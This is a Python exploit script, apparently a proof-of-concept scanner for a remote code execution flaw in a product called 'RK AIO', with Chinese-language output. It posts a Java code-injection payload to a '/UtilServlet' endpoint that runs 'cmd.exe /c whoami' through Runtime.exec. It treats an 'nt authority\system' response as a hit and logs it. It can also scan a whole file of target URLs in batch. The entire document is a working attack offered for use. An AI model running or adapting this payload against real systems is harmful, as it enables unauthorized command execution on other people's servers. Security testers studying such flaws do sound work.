import requests
import sys
import argparse

def checkVuln(url):
    vulnurl = url + "/UtilServlet"
    data = """operation=calculate&value=BufferedReader+br+%3d+new+BufferedReader(new+InputStreamReader(Runtime.getRuntime().exec("cmd.exe+/c+whoami").getInputStream()))%3bString+line%3bStringBuilder+b+%3d+new+StringBuilder()%3bwhile+((line+%3d+br.readLine())+!%3d+null)+{b.append(line)%3b}return+new+String(b)%3b&fieldName=example_field"""

    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
               'Content-Type': 'application/x-www-form-urlencoded'}
    try:
        response = requests.post(vulnurl, headers=headers, data=data, timeout=5, verify=False)
        if response.status_code == 200 and 'nt authority\system' in response.text:
            print(f"\033[1;33;40m【+】目标网站存在漏洞。{url}" + '\033[0m')
            with open("RK AIO.txt", "a+") as f:
                f.write(vulnurl + "\n")
        else:
            print(f"【-】目标网站不存在漏洞。{url}")
    except Exception as e:
        print(f"【-】目标网址存在网络连接问题。")


# 批量漏洞检测
def batchCheck(filename):
    with open(filename,"r") as f:
        for readline in f.readlines():
            checkVuln(readline)

def banner():
    bannerinfo = """ /$$$$$$$  /$$   /$$        /$$$$$$  /$$$$$$  /$$$$$$        /$$$$$$$   /$$$$$$  /$$$$$$$$
| $$__  $$| $$  /$$/       /$$__  $$|_  $$_/ /$$__  $$      | $$__  $$ /$$__  $$| $$_____/
| $$  \ $$| $$ /$$/       | $$  \ $$  | $$  | $$  \ $$      | $$  \ $$| $$  \__/| $$      
| $$$$$$$/| $$$$$/        | $$$$$$$$  | $$  | $$  | $$      | $$$$$$$/| $$      | $$$$$   
| $$__  $$| $$  $$        | $$__  $$  | $$  | $$  | $$      | $$__  $$| $$      | $$__/   
| $$  \ $$| $$\  $$       | $$  | $$  | $$  | $$  | $$      | $$  \ $$| $$    $$| $$      
| $$  | $$| $$ \  $$      | $$  | $$ /$$$$$$|  $$$$$$/      | $$  | $$|  $$$$$$/| $$$$$$$$
|__/  |__/|__/  \__/      |__/  |__/|______/ \______//$$$$$$|__/  |__/ \______/ |________/
                                                    |______/                              
                                                                                          
                                                                                          """
    print(bannerinfo)
    print("RK AIO_RCE".center(100,"="))
    print(f"[+]{sys.argv[0]} -u --url http://www.xxx.com 即可进行单个漏洞检测")
    print(f"[+]{sys.argv[0]} -u --file targetUrl.txt 即可对选中文档中的网址进行批量检测")
    print(f"[+]{sys.argv[0]} -h --help 查看更多详细帮助信息")
    print("@zhiang225".rjust(100, " "))

# 主程序
def main():
    parser = argparse.ArgumentParser(description='RK AIO_RCE漏洞单个检测脚本')
    parser.add_argument('-u', '--url', type=str, help='单个漏洞网址')
    parser.add_argument('-f', '--file', type=str, help='批量检测文本')
    args = parser.parse_args()
    if args.url:
        checkVuln(args.url)
    elif args.file:
        batchCheck(args.file)
    else:
        banner()

if __name__ == '__main__':
    main()